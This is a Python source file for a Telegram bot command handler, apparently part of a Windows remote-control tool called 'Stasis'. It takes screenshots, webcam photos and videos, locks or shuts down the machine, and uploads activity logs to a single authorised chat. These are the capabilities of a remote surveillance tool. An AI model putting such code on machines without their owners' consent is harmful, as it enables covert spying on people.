# src/core/telegram/command_handler.py

import os
import glob
import json
from datetime import datetime
from src.core.system_status import get_status_text
from src.core.screenshot import capture_screenshot
from src.core.system_actions import shutdown_system, restart_system, lock_system
from src.core.webcam import capture_webcam, record_video
from src.config.settings_manager import SettingsManager

class CommandHandler:
    def __init__(self, api):
        self.api = api

    def _log_command(self, cmd: str):
        try:
            val = SettingsManager.get("telegram_recent_commands")
            cmds = json.loads(val) if val else []
        except Exception:
            cmds = []
        
        cmds.insert(0, {
            "cmd": cmd,
            "timestamp": datetime.now().isoformat()
        })
        cmds = cmds[:5] # Keep last 5 commands
        SettingsManager.set("telegram_recent_commands", json.dumps(cmds))

    def handle(self, message: dict):
        text = message.get("text", "").strip()
        chat_id = str(message.get("chat", {}).get("id", "")).strip()

        if chat_id != self.api.chat_id:
            return

        command = text.lower()
        if command:
            self._log_command(command)

        if command == "/ping":
            self.api.send_message(get_status_text())

        elif command == "/screenshot":
            path = capture_screenshot()
            if path:
                self.api.send_photo(path, "Current Screen")
                os.remove(path)

        elif command == "/lock":
            self.api.send_message("Locking system...")
            lock_system()

        elif command == "/shutdown":
            self.api.send_message(
                "Shutdown requested.\nSend `/shutdown confirm` to proceed."
            )

        elif command == "/shutdown confirm":
            self.api.send_message("Shutting down...")
            shutdown_system()

        elif command == "/restart":
            self.api.send_message(
                "Restart requested.\nSend `/restart confirm` to proceed."
            )

        elif command == "/restart confirm":
            self.api.send_message("Restarting...")
            restart_system()

        elif command == "/camera":
            path = capture_webcam()
            if path:
                self.api.send_photo(path, "Webcam Snapshot")
                os.remove(path)

        elif command == "/getlog":
            self._send_logs()

        elif command.startswith("/video"):
            parts = command.split()
            duration = 10
            if len(parts) > 1 and parts[1].isdigit():
                duration = int(parts[1])

            self.api.send_message(f"Recording {duration}s video...")
            path = record_video(duration)

            if path:
                self.api.send_video(path, f"Webcam Clip ({duration}s)")
                os.remove(path)

    def _send_logs(self):
        app_name = "Stasis"
        base_path = os.path.join(
            os.environ.get("PROGRAMDATA", "C:\\ProgramData"),
            app_name,
        )

        patterns = [
            os.path.join(base_path, "activity_log_*.csv"),
            os.path.join(base_path, "system_file_activity_*.csv"),
        ]

        found = False
        for pattern in patterns:
            for log_path in glob.glob(pattern):
                self.api.send_document(
                    log_path,
                    f"Activity Log: {os.path.basename(log_path)}",
                )
                found = True

        if not found:
            self.api.send_message("No log files found.")